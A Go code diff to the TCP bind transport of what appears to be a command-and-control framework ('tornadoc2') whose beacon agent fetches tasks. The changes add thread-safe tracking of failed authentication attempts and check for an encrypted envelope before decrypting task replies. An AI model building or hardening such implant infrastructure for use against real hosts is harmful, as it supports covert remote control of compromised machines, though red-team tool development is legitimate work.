@@ -2,8 +2,8 @@ package transport
 
 import (
 	"bufio"
-	"crypto/subtle"
 	"crypto/ecdsa"
+	"crypto/subtle"
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
@@ -14,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"tornadoc2/agent/crypto"
 	"tornadoc2/agent/features"
 	"tornadoc2/agent/internal/pivot"
 	"tornadoc2/agent/protocol"
@@ -205,20 +206,27 @@ func (t *tcpBindTransport) acceptOne() error {
 			"tcp bind: no token configured, or token invalid hex")
 	}
 	if subtle.ConstantTimeCompare(tok, t.tokenBytes) != 1 {
-		t.failures++
 		conn.Close()
-		if t.failures >= tcpBindMaxFailures {
+		t.mu.Lock()
+		t.failures++
+		exceeded := t.failures >= tcpBindMaxFailures
+		if exceeded {
 			diag("[beacon] tcp bind: closing listener after %d "+
 				"failed auth attempts\n", t.failures)
 			t.closed = true
 			t.closeListener()
+		}
+		t.mu.Unlock()
+		if exceeded {
 			return fmt.Errorf(
 				"tcp bind: too many failed attempts; " +
 					"listener disabled for this process")
 		}
 		return errors.New("tcp bind: auth failed")
 	}
+	t.mu.Lock()
 	t.failures = 0
+	t.mu.Unlock()
 
 	conn.SetReadDeadline(
 		time.Now().Add(tcpBindRoundTripTimeout))
@@ -454,7 +462,7 @@ func (t *tcpBindTransport) FetchTasks(wire *WireSession) ([]Task, error) {
 	}
 	body := []byte(reply.Body)
 
-	if wire != nil {
+	if wire != nil && crypto.IsEnvelope(body) {
 		plain, wasEnc, derr := wire.DecryptResponse(body)
 		if derr != nil {
 			return nil, fmt.Errorf("tcp bind: decrypt: %w", derr)
